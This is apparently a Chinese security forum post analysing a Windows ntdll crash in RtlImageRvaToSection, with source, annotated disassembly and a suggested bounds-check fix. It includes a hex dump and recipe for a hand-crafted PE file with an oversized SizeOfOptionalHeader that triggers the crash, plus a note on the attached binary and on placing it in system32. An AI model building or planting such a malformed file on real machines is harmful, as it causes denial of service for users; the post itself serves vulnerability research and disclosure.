
```
/*

* @implemented

*/

PIMAGE_SECTION_HEADER

NTAPI

RtlImageRvaToSection(

PIMAGE_NT_HEADERS NtHeader,

PVOID BaseAddress,

ULONG Rva)

{

PIMAGE_SECTION_HEADER Section;

ULONG Va;

ULONG Count;

Count = SWAPW(NtHeader->FileHeader.NumberOfSections);

Section = IMAGE_FIRST_SECTION(NtHeader);

while (Count--)

{

Va = SWAPD(Section->VirtualAddress);

if ((Va <= Rva) &&

(Rva < Va + SWAPD(Section->Misc.VirtualSize)))

return Section;

Section++;

}

return NULL;

}
```

反汇编如下:

```
77D99095 > $ 8BFF mov edi, edi ; ntdll.RtlImageRvaToSection

77D99097 . 55 push ebp

77D99098 . 8BEC mov ebp, esp

77D9909A . 8B4D 08 mov ecx, dword ptr ss:[ebp+8] ; // 这里是取 PE Header 里的 Signature

77D9909D . 66:8B41 14 mov ax, word ptr ds:[ecx+14] // 这里是崩溃的原因. 取的是 PE Header 里的 SizeOfOptionalHeader

77D990A1 . 0FB7C0 movzx eax, ax

77D990A4 . 8D4408 18 lea eax, dword ptr ds:[eax+ecx+18]

77D990A8 . 0FB749 06 movzx ecx, word ptr ds:[ecx+6]

77D990AC . 56 push esi

77D990AD . 33F6 xor esi, esi

77D990AF . 57 push edi

77D990B0 . 85C9 test ecx, ecx

77D990B2 .^ 0F86 0861FCFF jbe ntdll.77D5F1C0

77D990B8 > 8B50 0C mov edx, dword ptr ds:[eax+C] // 这里就是崩溃的时候了. <<---------77D990BB . 3955 10 cmp dword ptr ss:[ebp+10], edx

77D990BE .^ 0F82 F060FCFF jb ntdll.77D5F1B4

77D990C4 . 8B78 10 mov edi, dword ptr ds:[eax+10]

77D990C7 . 03FA add edi, edx

77D990C9 . 397D 10 cmp dword ptr ss:[ebp+10], edi

77D990CC .^ 0F83 E260FCFF jnb ntdll.77D5F1B4

77D990D2 > 5F pop edi

77D990D3 . 5E pop esi

77D990D4 . 5D pop ebp

77D990D5 . C2 0C00 retn 0C
```

看到这里,相信大家都知道原因了吧.

```
77D9909D . 66:8B41 14 mov ax, word ptr ds:[ecx+14] // 因
这里取的是 image_optional_header 的大小.如果我精心构造一个 PE. 让他的体积,小于 sizeofoptionheader 会怎样?
这里没有判断.什么也没有.直接过去读取了...

77D990B8 > 8B50 0C mov edx, dword ptr ds:[eax+C] // 果
这里就是直接读取了.于是乎报错...
```

下面.(不知道为什么,看到”下面”两个字,感觉怪怪的.可能是最近群里面朋友发的图片看多了吧..)

下面我们来手工精心构造一个”0Day”

我就不细细介绍了.网上有很多手写 PE 的文章.

```
Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F

00000000 4D 5A 20 57 69 6E 64 6F 77 73 20 30 44 61 79 20 MZ Windows 0Day

00000010 42 79 00 B0 EB BD EF B0 CB 83 C9 00 44 61 74 65 By.半斤八兩.Date

00000020 3A 32 30 31 34 2E 30 34 2E 32 34 20 20 20 20 20 :2014.04.24

00000030 20 20 20 20 20 20 20 20 20 20 20 20 40 00 00 00 @...

00000040 50 45 00 00 4C 01 08 00 16 EB E4 4D 00 00 00 00 PE..L....脘 M....

00000050 00 00 00 00 [COLOR="Red"][B]22 22[/B][/COLOR] 00 00 0B 01 09 00 00 86 1E 00 ...."".......?.

00000060 00 98 0B 00 00 00 00 00 6A DE 0E 00 00 10 00 00 .?.....j?.....

00000070 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 ......@.........

00000080 05 00 00 00 00 00 00 00 05 00 00 00 00 00 00 00 ................

00000090 E9 4F 1A E9 00 04 00 00 00 00 00 00 02 00 40 81 镺.?.........@?

000000A0 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 ................

000000B0 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 ................

000000C0 00 A0 32 00 F0 00 00 00 00 10 33 00 50 0D 04 00 .?.?....3.P...

000000D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................

000000E0 00 20 37 00 A8 64 01 00 10 21 2D 00 1C 00 00 00 . 7.╠...!-.....

000000F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................

00000100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................

00000110 00 00 00 00 00 00 00 00 A8 B1 32 00 B8 10 00 00 ........ū2.?..

00000120 00 00 33 00 40 00 00 00 00 00 00 00 00 00 00 00 ..3.@...........

00000130 00 00 00 00 00 00 00 00 B0 EB BD EF B0 CB 83 C9 ........半斤八兩

00000140 00 70 0E 00 00 10 00 00 00 00 00 00 00 00 00 00 .p..............

00000150 00 00 00 00 00 00 00 00 00 00 00 00 A0 00 00 E0 ............?. 
```

这上面红色标识的就是 `sizeofoptionhead`. 只要把这个改成大于 `0x1000` 就可以了.

这个解决办法应该是在读取的时候,加下简单的判断.

`.if sizeofoptionheader >= getfilesize() then`

就可以避免这样的问题了.

如果大家不幸中招,可以按 `ctrl+alt+del` 或者 `ctrl+alt+.` 再或者 `ctrl+shift+esc` 等.调出 `taskmgr` 然后用 `cmd.exe` 来删除 “0Day” 即可 :)

附件为精心构造的程序.如果是在 windows win7 下,大家就要小心了.

解压密码:`bjbl`

千万别不小心放到 `%windir%\system32` 目录下了

最后感谢 J 师傅发的 bin. 要不然也不会有此发现.

注：本帖由看雪论坛志愿者PEstone 重新将附件整理排版，若和原文有出入，以原作者附件为准

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [精心构造漏洞Bin.7z](javascript:void(0);)
  （0.40kb，508次下载）

- [再暴Windows崩溃漏洞PDF.7z](javascript:void(0);)
  （209.09kb，581次下载）

- [1.png](javascript:void(0);)
  （97.94kb，8次下载）

- [2.png](javascript:void(0);)
  （131.59kb，6次下载）
